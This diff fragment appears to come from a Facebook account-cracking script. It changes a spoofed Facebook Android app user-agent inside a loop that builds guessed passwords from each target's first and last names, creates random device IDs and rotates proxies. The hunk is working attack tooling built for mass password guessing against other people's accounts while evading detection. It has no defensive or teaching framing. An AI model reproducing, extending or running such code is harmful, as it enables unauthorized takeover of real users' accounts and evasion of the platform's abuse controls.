@@ -483,7 +483,7 @@ def M_file_1(ids,names,passlist):
                                 
                         for pw in passlist:
                                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                                u1a ="[FBAN/FB4A;FBAV/416.0.0.35.85;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/442213661;FBCR/PENNYmobil Prepaid;FBMF/Tecno;FBBD/tecno;FBDV/KF4;FBSV/12.7.0;FBCA/x86_64:armeabi-v7a;FBDM/{density=3.8,width=759,height=1309};FB_FW/1;]"
+                                u1a ="[FBAN/FB4A;FBAV/197.0.0.46.98;FBBV/130483514;FBDM/{density=1.0,width=1174,height=2425};FBLC/de_DE;FBRV/130680556;FB_FW/2;FBCR/Netto Prepaid;FBMF/Asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ZS670KS;FBSV/9.7.5;FBOP/19;FBCA/x86_64:armeabi-v7a;]"
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 nip=random.choice(proxsi)
